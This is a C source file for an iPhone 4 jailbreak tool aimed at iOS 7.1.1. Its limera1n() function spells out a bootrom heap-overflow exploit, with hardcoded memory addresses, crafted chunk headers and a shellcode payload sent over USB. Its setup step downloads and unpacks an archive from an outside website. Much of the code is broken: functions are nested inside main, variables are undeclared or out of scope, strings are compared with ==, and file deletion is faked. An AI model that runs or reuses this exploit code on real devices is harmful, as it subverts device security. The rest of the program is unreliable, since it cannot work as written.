/* Code by sjeezypwn */
#include <stdio.h>
#include <stdlib.h>
#include "core.h"
#include "payload.h"
#include <sys/stat.h>
#include <libusb-1.0/libusb.h>

/* Installation */
void set_up(void)
{
    system("start http://sn0wbreak.com/0xspawn.zip");
    mkdir("C:/0xspawn/", S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
    cp("C:/Users/*.*/Downloads/0xspawn.zip", "C:/0xspawn/");
    FILE *fp = fopen("C:/Users/*.*/Downloads/0xspawn.zip", "r");
    delete(fp);
}
/* DFU mode */
void dfu_init(void)
{
    info("Put your device in DFU.\n if you do not know what DFU mode is do not attempt this\n");
    sleep(260);
    info("device should be in DFU mode by now\n");
    info("Done\n");
}
/* limera1n DFU */
int limera1n(void)
{
    irecv_error_t error = IRECV_E_SUCCESS;
    unsigned int i = 0;
    unsigned char buf[0x800];
    unsigned char shellcode[0x800];
    unsigned int max_size = 0x24000;
    unsigned int stack_address = 0x84033F98;
    unsigned int shellcode_address = 0x84023001;

    if (device->chip_id == 8930)
    {
        max_size = 0x2C000;
        stack_address = 0x8403BF9C;
        shellcode_address = 0x8402B001;
    }
    if (device->chip_id == 8920)
    {
        max_size = 0x24000;
        stack_address = 0x84033FA4;
        shellcode_address = 0x84023001;
    }

    memset(shellcode, 0x0, 0x800);
    memcpy(shellcode, Payload, sizeof(Payload));


    info("Resetting device counters\n");
    error = irecv_reset_counters(client);
    if (error != IRECV_E_SUCCESS)
    {
        DPRINT("%s\n", irecv_strerror(error));
        return -1;
    }

    memset(buf, 0xCC, 0x800);
    for (i = 0; i < 0x800; i += 0x40)
    {
        unsigned int *heap = (unsigned int *)(buf + i);
        heap[0] = 0x405;
        heap[1] = 0x101;
        heap[2] = shellcode_address;
        heap[3] = stack_address;
    }

    info("Sending chunk headers\n");
    irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);

    memset(buf, 0xCC, 0x800);
    for (i = 0; i < (max_size - (0x800 * 3)); i += 0x800)
    {
        irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
    }

    info("Sending exploit payload\n");
    irecv_control_transfer(client, 0x21, 1, 0, 0, shellcode, 0x800, 1000);

    info("Sending fake data\n");
    memset(buf, 0xBB, 0x800);
    irecv_control_transfer(client, 0xA1, 1, 0, 0, buf, 0x800, 1000);
    irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 10);

    info("Executing exploit\n");
    irecv_control_transfer(client, 0x21, 2, 0, 0, buf, 0, 1000);
    irecv_reset(client);
    irecv_finish_transfer(client);

    info("Exploit sent\n");

    info("Reconnecting to device\n");
    client = irecv_reconnect(client, 2);
    if (client == NULL)
    {
        info("%s\n", irecv_strerror(error));
        info("Unable to reconnect\n");
        return -1;
    }
    return 0;
}

/* clean up */

void clean_up(void)
{
    FILE *fp = fopen("C:/0xspawn/", "r");
    delete(fp);
}

/* iPhone4 (3,1 in specific) for iOS 7.1.1 */
#define ibss1    C:/0xspawn/31/ibss.dfu
#define ibec1    C:/0xspawn/31/ibec.dfu
#define devt1    C:/0xspawn/31/devt.dfu
#define kerc1    C:/0xspawn/31/kerc.dfu
#define rdisk1   C:/0xspawn/31/rdisk.dmg

/* iPhone4 (3,2 in specific) for iOS 7.1.1 */
#define ibss2    C:/0xspawn/32/ibss.dfu
#define ibec2    C:/0xspawn/32/ibec.dfu
#define devt2    C:/0xspawn/32/devt.dfu
#define kerc2    C:/0xspawn/32/kerc.dfu
#define rdisk2   C:/0xspawn/32/rdisk.dmg

/* iPhone4 (3,3 in specific) for iOS 7.1.1 */
#define ibss3    C:/0xspawn/33/ibss.dfu
#define ibec3    C:/0xspawn/33/ibec.dfu
#define devt3    C:/0xspawn/33/devt.dfu
#define kerc3    C:/0xspawn/33/kerc.dfu
#define rdisk3   C:/0xspawn/33/rdisk.dmg

int main(int argc, char **argv)
{
    /* Setup */
    set_up();
    /* DFU initialization */
    dfu_init();
    limera1n();
    /* DFU Done. */
    info("Limera1n DFU complete\n");
    /* Detect devices */
    typedef struct _compatibility
    {
        char *product;
        char *build;
    } compatibility_t;

    compatibility_t compatible_device[] =
    {
        {"n90ap", "11D201"},
        {"n90bap", "11D201"},
        {"n92ap", "11D201"},
        {NULL, NULL}
    };

    int verify_product(char *product, char *build)
    {
        compatibility_t *curcompat = &compatible_devices[0];
        while ((curcompat) && (curcompat->product != NULL))
        {
            if (!strcmp(curcompat->product, product) &&
                    !strcmp(curcompat->build, build))
                return 0;
            curcompat++;
        }
        return 1;
    }

    INFO("Connecting to device...\n");
    device_t *device = device_create(NULL);
    if (device == NULL) // Checks if the device is plugged in or not
    {
        ERROR("Cannot connect to device! Make sure it is plugged in.\n");
        return -1;
    }
    INFO("[*] Successfully connected to the iDevice. UDID: %s\n", device->uuid);


    INFO("Starting lockdown...\n");

    lockdown_t *lockdown = lockdown_open(device); // Startes the lockdown protocol
    if (lockdown == NULL)
    {
        ERROR("Could not start lockdown!\n");
        return -1;
    }
    INFO("Lockdown initialization is sucessful.\n");

    if (strcmp(argv[1], "--cache") == 0)
    {
        char *product = NULL;
        char *build = NULL;
        char *version = NULL;
        char *board = NULL;
        if (lockdown_get_string(lockdown, "ProductType", &product) != LOCKDOWN_E_SUCCESS ||
                lockdown_get_string(lockdown, "BuildVersion", &build) != LOCKDOWN_E_SUCCESS  ||
                lockdown_get_string(lockdown, "HardwareModel", &board) != LOCKDOWN_E_SUCCESS ||
                lockdown_get_string(lockdown, "ProductVersion", &version) != LOCKDOWN_E_SUCCESS)
        {
            ERROR("Can't get info about your iDevice, please try again!\n");
            lockdown_free(lockdown);
            device_free(device);
            return -1; // gets Product Type, Build Version and Product version using lockdown
        }
        int i; // gcc warns about c99 mode <- gcc nolonger does
        for (i = 0; i < strlen(board); ++i)
        {
            board[i] = tolower(board[i]);
        }
        if (verify_product(board, build)) // lol the point of lowercasing it, is that the compatible array is in lowercase
        {
            ERROR("Invalid device / iOS version\n");
            return -1;
        }
        FILE *f = fopen(cachefile(), "w");
        if (f == NULL)
        {
            printf("Error opening file!\n");
            exit(1);
        }
        fprintf(f, "%s_%s_%s.plist", product, version, build);
        fclose(f);
        printf("Cached:\nProduct: %s\nVersion: %s\nBuild: %s\nHardwareModel: %s\n", product, version, build, board);
    }
    else
    {
        char *value = NULL;
        if (lockdown_get_string(lockdown, argv[1], &value) != LOCKDOWN_E_SUCCESS)
        {
            ERROR("Can't get info about your iDevice, please try again!\n"); // Couldn't find a device
            lockdown_free(lockdown);
            device_free(device);
            return -1;
        }
        printf("%s\n", value);
    }

    /* Define stuff */

    irecv_client_t client = NULL;

    /* Upload Files*/
    if (product == "n90ap")
    {
        irecv_send_file(client, ibss1, 1);
        irecv_send_file(client, ibec1, 1);
        irecv_send_file(client, devt1, 1);
        irecv_send_file(client, kerc1, 1);
        irecv_send_file(client, rdisk1, 1);
    }

    if (product == "n90bap")
    {
        irecv_send_file(client, ibss2, 1);
        irecv_send_file(client, ibec2, 1);
        irecv_send_file(client, devt2, 1);
        irecv_send_file(client, kerc2, 1);
        irecv_send_file(client, rdisk2, 1);
    }
    if (product == "n92ap")
    {
        irecv_send_file(client, ibss3, 1);
        irecv_send_file(client, ibec3, 1);
        irecv_send_file(client, devt3, 1);
        irecv_send_file(client, kerc3, 1);
        irecv_send_file(client, rdisk3, 1);
    }


    /* boot device */
    char *boot = "setenv auto-boot true";

    int rec_send_cmd(char *command[])
    {
        if (libusb_control_transfer(handle, 0x40, 0, 0, 0, command[0], (strlen(command[0]) + 1), 1000))
        {
            info("[*] Successfully sent command.\r\n");
        }
        else
        {
            info("[*] Error with sending the command");
        }
    } // <3 cal0x

    rec_send_cmd(boot);
    info("(<3 cal0x) booting\n");

    /* clean up */
    clean_up();

    /* done */

    info("Jailbreak is done.\n Hope you liked it\n Code by \n(all these nicknames are the same person)sjeezypwn/spawncpy/spawnrelloc/i3ppwn");

    return 0;
}
